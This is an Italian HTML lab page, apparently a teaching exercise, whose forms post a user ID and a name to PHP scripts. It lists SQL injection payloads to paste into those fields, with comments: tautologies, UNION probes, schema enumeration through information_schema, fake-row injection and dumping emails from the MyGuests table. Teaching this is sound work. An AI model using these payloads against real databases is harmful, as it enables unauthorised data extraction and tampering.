<!DOCTYPE html>
<html>
<head>
    <title>SQL Injection - Test payloads</title>
</head>
<body>
    <h3>SQL Injection:</h3>
    <form method='POST' action='esempio35_2.php'>
        <label for='id'>Inserisci ID utente:</label><br>
        <input type='text' name='id' id='id' required><br><br>
        <input type='submit' value='Visualizza'>
    </form>
    
    <h3>Esempi da incollare nel campo <code>id</code></h3>
    <pre>
        1 OR 1=1 --
            trasforma la condizione in una tautologia.
            può far tornare più righe se la query non è parametrizzata.
        
        1 UNION SELECT 1, 'COL2', 'COL3', 'COL4', 'COL5', 'COL6', 'COL7' --
            tenta di unire ai risultati una riga con valori arbitrari.
            funziona solo se numero/tipi colonne corrispondono alla query originale
            provare con meno colonne fino a scoprire quante colonne restituisce la query originale.
            
        1 UNION SELECT 1, user(), database(), version(), NOW() --
            inietta funzioni server-side per esporre metadati (user(), database(), version(), NOW()) nell'output visibile.
                    
        1 UNION SELECT 1, (SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema = database()), NULL, NULL, NULL --
            interroga information_schema per ottenere i nomi delle tabelle e li concatena via GROUP_CONCAT
            risultato soggetto a limiti di lunghezza e permessi.
            
        1 UNION SELECT 1, (SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='MyGuests' AND table_schema = database()), NULL, NULL, NULL --
            rivela i nomi delle colonne di MyGuests.
            
        -1 UNION ALL SELECT 1,'attacker','attacker','attacker@example.com','2000-01-01' UNION ALL SELECT 2,'override','override','override','2002-02-02' UNION ALL SELECT 3,'intruder','intruder','intruder','2003-03-03' --
            forza la prima parte a non restituire righe (id=-1) e aggiunge più righe arbitrarie tramite UNION ALL.
            puo essere usata per mostrare record falsi e esporre link o testi che inducano azioni utili all’attaccante.

        -1 UNION SELECT 1, (SELECT GROUP_CONCAT(email SEPARATOR ', ') FROM MyGuests), NULL, NULL, NULL --
            estrae e concatena record da MyGuests in una singola colonna.
            dipende da schema, permessi e limiti di GROUP_CONCAT.
    </pre>
    
    <form method='POST' action='esempio35_3.php'>
        <label for='id'>Inserisci Nome e Cognome utente:</label><br>
        <input type='text' name='nome' id='nome' required><br><br>
        <input type='text' name='cognome' id='cognome' required><br><br>
        <input type='submit' value='Visualizza'>
    </form>

    <pre>
        A' OR 1=1 #
            trasforma la condizione in una tautologia.
            può far tornare più righe se la query non è parametrizzata.
    </pre>
</body>
</html>
